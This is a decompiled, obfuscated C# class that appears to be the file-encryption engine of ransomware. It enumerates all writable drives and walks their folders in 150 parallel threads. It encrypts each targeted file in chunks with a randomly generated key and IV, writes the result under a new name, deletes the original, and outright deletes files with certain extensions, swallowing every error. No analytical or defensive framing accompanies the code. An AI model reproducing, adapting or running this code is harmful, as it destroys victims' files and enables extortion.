using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading.Tasks;

public sealed class GClass2 : IDisposable
{
	private sealed class Class7
	{
		public List<string> list_0;

		public GClass2 gclass2_0;

		internal void method_0()
		{
			gclass2_0.method_16(list_0);
		}
	}

	private sealed class Class8
	{
		public string string_0;

		public GClass2 gclass2_0;

		internal void method_0()
		{
			gclass2_0.method_19(string_0, gclass2_0.method_10().Count - 1);
		}
	}

	private sealed class Class9
	{
		public string string_0;

		internal bool method_0(string string_1)
		{
			return string_1 == string_0;
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct Struct1 : IAsyncStateMachine
	{
		public int int_0;

		public AsyncTaskMethodBuilder asyncTaskMethodBuilder_0;

		public GClass2 gclass2_0;

		private TaskAwaiter taskAwaiter_0;

		private void MoveNext()
		{
			int num = int_0;
			GClass2 gClass = gclass2_0;
			try
			{
				TaskAwaiter awaiter;
				if (num != 0)
				{
					if (num == 1)
					{
						awaiter = taskAwaiter_0;
						taskAwaiter_0 = default(TaskAwaiter);
						num = -1;
						int_0 = -1;
						goto IL_0139;
					}
					ProtectedMemory.Protect(gClass.method_4(), (MemoryProtectionScope)2);
					awaiter = gClass.method_18().GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						int_0 = 0;
						taskAwaiter_0 = awaiter;
						asyncTaskMethodBuilder_0.AwaitUnsafeOnCompleted(ref awaiter, ref this);
						return;
					}
				}
				else
				{
					awaiter = taskAwaiter_0;
					taskAwaiter_0 = default(TaskAwaiter);
					num = -1;
					int_0 = -1;
				}
				awaiter.GetResult();
				List<Task> list = new List<Task>();
				List<List<string>>.Enumerator enumerator = gClass.method_10().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						Class7 @class = new Class7();
						@class.gclass2_0 = gClass;
						@class.list_0 = enumerator.Current;
						list.Add(Task.Run((Action)@class.method_0));
					}
				}
				finally
				{
					if (num < 0)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				awaiter = Task.WhenAll(list).GetAwaiter();
				if (!awaiter.IsCompleted)
				{
					num = 1;
					int_0 = 1;
					taskAwaiter_0 = awaiter;
					asyncTaskMethodBuilder_0.AwaitUnsafeOnCompleted(ref awaiter, ref this);
					return;
				}
				goto IL_0139;
				IL_0139:
				awaiter.GetResult();
				gClass.Dispose();
			}
			catch (Exception exception)
			{
				int_0 = -2;
				asyncTaskMethodBuilder_0.SetException(exception);
				return;
			}
			int_0 = -2;
			asyncTaskMethodBuilder_0.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			asyncTaskMethodBuilder_0.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}
	}

	[StructLayout(LayoutKind.Auto)]
	private struct Struct2 : IAsyncStateMachine
	{
		public int int_0;

		public AsyncTaskMethodBuilder asyncTaskMethodBuilder_0;

		public GClass2 gclass2_0;

		private TaskAwaiter taskAwaiter_0;

		private void MoveNext()
		{
			int num = int_0;
			GClass2 gClass = gclass2_0;
			try
			{
				try
				{
					TaskAwaiter awaiter;
					if (num != 0)
					{
						List<Task> list = new List<Task>();
						List<string>.Enumerator enumerator = gClass.method_20().GetEnumerator();
						try
						{
							while (enumerator.MoveNext())
							{
								Class8 @class = new Class8();
								@class.gclass2_0 = gClass;
								@class.string_0 = enumerator.Current;
								gClass.method_10().Add(new List<string>());
								list.Add(Task.Run((Action)@class.method_0));
							}
						}
						finally
						{
							if (num < 0)
							{
								((IDisposable)enumerator).Dispose();
							}
						}
						awaiter = Task.WhenAll(list).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = 0;
							int_0 = 0;
							taskAwaiter_0 = awaiter;
							asyncTaskMethodBuilder_0.AwaitUnsafeOnCompleted(ref awaiter, ref this);
							return;
						}
					}
					else
					{
						awaiter = taskAwaiter_0;
						taskAwaiter_0 = default(TaskAwaiter);
						num = -1;
						int_0 = -1;
					}
					awaiter.GetResult();
					gClass.method_10().ForEach(gClass.method_26);
					gClass.method_11(null);
					gClass.method_17();
					gClass.Dispose();
				}
				catch
				{
				}
			}
			catch (Exception exception)
			{
				int_0 = -2;
				asyncTaskMethodBuilder_0.SetException(exception);
				return;
			}
			int_0 = -2;
			asyncTaskMethodBuilder_0.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			asyncTaskMethodBuilder_0.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}
	}

	private GClass1 gclass1_0;

	private GClass0 gclass0_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private List<string> list_0;

	private List<List<string>> list_1;

	private int int_0;

	public GClass2(GClass1 gclass1_1)
	{
		method_1(gclass1_1);
		method_3(new GClass0(method_0()));
		method_9(new List<string>());
		method_11(new List<List<string>>());
		method_13(150);
		method_5(new byte[32]);
		method_7(new byte[16]);
	}

	public GClass1 method_0()
	{
		return gclass1_0;
	}

	public void method_1(GClass1 gclass1_1)
	{
		gclass1_0 = gclass1_1;
	}

	public GClass0 method_2()
	{
		return gclass0_0;
	}

	public void method_3(GClass0 gclass0_1)
	{
		gclass0_0 = gclass0_1;
	}

	public byte[] method_4()
	{
		return byte_0;
	}

	public void method_5(byte[] byte_2)
	{
		byte_0 = byte_2;
	}

	public byte[] method_6()
	{
		return byte_1;
	}

	public void method_7(byte[] byte_2)
	{
		byte_1 = byte_2;
	}

	private List<string> method_8()
	{
		return list_0;
	}

	private void method_9(List<string> list_2)
	{
		list_0 = list_2;
	}

	private List<List<string>> method_10()
	{
		return list_1;
	}

	private void method_11(List<List<string>> list_2)
	{
		list_1 = list_2;
	}

	private int method_12()
	{
		return int_0;
	}

	private void method_13(int int_1)
	{
		int_0 = int_1;
	}

	public void Dispose()
	{
		GC.Collect();
		GC.SuppressFinalize(this);
	}

	public async Task method_14()
	{
		ProtectedMemory.Protect(method_4(), (MemoryProtectionScope)2);
		await method_18();
		List<Task> list = new List<Task>();
		using (List<List<string>>.Enumerator enumerator = method_10().GetEnumerator())
		{
			while (enumerator.MoveNext())
			{
				Class7 @class = new Class7();
				@class.gclass2_0 = this;
				@class.list_0 = enumerator.Current;
				list.Add(Task.Run((Action)@class.method_0));
			}
		}
		await Task.WhenAll(list);
		Dispose();
	}

	public void method_15(string string_0)
	{
		try
		{
			string path = string_0 + Class4.smethod_0(1550579277) + method_0().method_8() + Class4.smethod_0(1550579285) + method_0().method_6() + Class4.smethod_0(1550579292);
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
			long length = fileStream.Length;
			if (new DriveInfo(Path.GetPathRoot(string_0)).AvailableFreeSpace <= length * 2L)
			{
				return;
			}
			if (length > 0L)
			{
				FileStream fileStream2 = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
				int num = 0;
				long num2 = 50000000L;
				long num3 = 0L;
				List<byte> list = new List<byte>();
				while ((num = fileStream.ReadByte()) != -1)
				{
					list.Add((byte)num);
					num3++;
					if (list.Count == num2)
					{
						byte[] source = list.ToArray();
						ProtectedMemory.Unprotect(method_4(), (MemoryProtectionScope)2);
						method_2().method_2(ref source, method_4(), method_6());
						ProtectedMemory.Protect(method_4(), (MemoryProtectionScope)2);
						list = source.ToList();
						list.Add(124);
						foreach (byte item in list)
						{
							fileStream2.WriteByte(item);
						}
						list = new List<byte>();
						Dispose();
					}
					else
					{
						if (num3 + 1L < length)
						{
							continue;
						}
						byte[] source2 = list.ToArray();
						ProtectedMemory.Unprotect(method_4(), (MemoryProtectionScope)2);
						method_2().method_2(ref source2, method_4(), method_6());
						ProtectedMemory.Protect(method_4(), (MemoryProtectionScope)2);
						method_2().Dispose();
						list = source2.ToList();
						foreach (byte item2 in list)
						{
							fileStream2.WriteByte(item2);
						}
						list = null;
						Dispose();
						break;
					}
				}
				list = null;
				Dispose();
				fileStream.Close();
				fileStream2.Close();
				try
				{
					File.Delete(string_0);
				}
				catch
				{
				}
			}
			else
			{
				fileStream.Close();
			}
			Dispose();
		}
		catch
		{
		}
	}

	public void method_16(List<string> list_2)
	{
		try
		{
			foreach (string item in list_2)
			{
				try
				{
					if (!method_23(item))
					{
						method_15(item);
						continue;
					}
					try
					{
						File.Delete(item);
					}
					catch
					{
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	public void method_17()
	{
		try
		{
			method_11(new List<List<string>>());
			for (int i = 0; i < method_12(); i++)
			{
				method_10().Add(new List<string>());
			}
			int num = 0;
			foreach (string item in method_8())
			{
				if (num == method_12())
				{
					num = 0;
				}
				method_10()[num].Add(item.Split(new char[1] { '|' })[1]);
				num++;
			}
			method_9(null);
			Dispose();
		}
		catch
		{
		}
	}

	public async Task method_18()
	{
		try
		{
			List<Task> list = new List<Task>();
			using (List<string>.Enumerator enumerator = method_20().GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Class8 @class = new Class8();
					@class.gclass2_0 = this;
					@class.string_0 = enumerator.Current;
					method_10().Add(new List<string>());
					list.Add(Task.Run((Action)@class.method_0));
				}
			}
			await Task.WhenAll(list);
			method_10().ForEach(method_26);
			method_11(null);
			method_17();
			Dispose();
		}
		catch
		{
		}
	}

	public void method_19(string string_0, int int_1)
	{
		try
		{
			string[] files = Directory.GetFiles(string_0);
			foreach (string text in files)
			{
				if (method_22(text))
				{
					try
					{
						long length = new FileInfo(text).Length;
						method_10()[int_1].Add(string.Format(Class4.smethod_0(1550579309), length, text));
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files = Directory.GetDirectories(string_0);
			foreach (string string_ in files)
			{
				if (method_24(string_))
				{
					method_19(string_, int_1);
				}
			}
		}
		catch
		{
		}
	}

	public List<string> method_20()
	{
		List<string> list = new List<string>();
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			try
			{
				string name = driveInfo.Name;
				if (method_21(name))
				{
					list.Add(name);
				}
				name = null;
			}
			catch
			{
			}
		}
		Dispose();
		return list;
	}

	public bool method_21(string string_0)
	{
		try
		{
			string empty = string.Empty;
			empty = ((!(string_0[string_0.Length - 1].ToString() == Class4.smethod_0(1550579269))) ? (string_0 + Class4.smethod_0(1550579341)) : (string_0 + Class4.smethod_0(1550579327)));
			File.WriteAllText(empty, Class4.smethod_0(1550579362));
			File.Delete(empty);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public bool method_22(string string_0)
	{
		try
		{
			string text = Path.GetFileName(string_0)!.ToLower().Replace(Class4.smethod_0(1550578161), string.Empty);
			string extension = Path.GetExtension(string_0);
			if (!text.Contains(Class4.smethod_0(1550578169)) && !text.Contains(Class4.smethod_0(1550579375)))
			{
				if (extension != Class4.smethod_0(1550579385) && extension != Class4.smethod_0(1550579403))
				{
					return true;
				}
				return false;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public bool method_23(string string_0)
	{
		try
		{
			Class9 @class = new Class9();
			List<string> source = new List<string>
			{
				Class4.smethod_0(1550579408),
				Class4.smethod_0(1550579421),
				Class4.smethod_0(1550579434),
				Class4.smethod_0(1550579447),
				Class4.smethod_0(1550579452),
				Class4.smethod_0(1550579465),
				Class4.smethod_0(1550579478),
				Class4.smethod_0(1550579490),
				Class4.smethod_0(1550579503),
				Class4.smethod_0(1550579508),
				Class4.smethod_0(1550579521),
				Class4.smethod_0(1550579534),
				Class4.smethod_0(1550579547),
				Class4.smethod_0(1550579552),
				Class4.smethod_0(1550579565),
				Class4.smethod_0(1550579581),
				Class4.smethod_0(1550579598),
				Class4.smethod_0(1550579610),
				Class4.smethod_0(1550579623),
				Class4.smethod_0(1550579628),
				Class4.smethod_0(1550579641),
				Class4.smethod_0(1550579654),
				Class4.smethod_0(1550579666),
				Class4.smethod_0(1550579678),
				Class4.smethod_0(1550579690),
				Class4.smethod_0(1550579703),
				Class4.smethod_0(1550579708),
				Class4.smethod_0(1550578697)
			};
			@class.string_0 = Path.GetExtension(string_0)!.ToLower();
			if (source.FirstOrDefault(@class.method_0) != null)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return true;
		}
	}

	public bool method_24(string string_0)
	{
		try
		{
			List<string> obj = new List<string>
			{
				Class4.smethod_0(1550578710),
				Class4.smethod_0(1550578720),
				Class4.smethod_0(1550578740),
				Class4.smethod_0(1550578770),
				Class4.smethod_0(1550578784),
				Class4.smethod_0(1550578800)
			};
			string_0 = string_0.ToLower();
			foreach (string item in obj)
			{
				if (string_0.Contains(item))
				{
					return false;
				}
			}
			return true;
		}
		catch
		{
			return false;
		}
	}

	public void method_25()
	{
		method_5(new byte[32]);
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		try
		{
			rNGCryptoServiceProvider.GetBytes(method_4());
		}
		finally
		{
			((IDisposable)rNGCryptoServiceProvider).Dispose();
		}
		method_7(new byte[16]);
		RNGCryptoServiceProvider rNGCryptoServiceProvider2 = new RNGCryptoServiceProvider();
		try
		{
			rNGCryptoServiceProvider2.GetBytes(method_6());
		}
		finally
		{
			((IDisposable)rNGCryptoServiceProvider2).Dispose();
		}
	}

	private void method_26(List<string> list_2)
	{
		method_8().AddRange(list_2);
	}
}
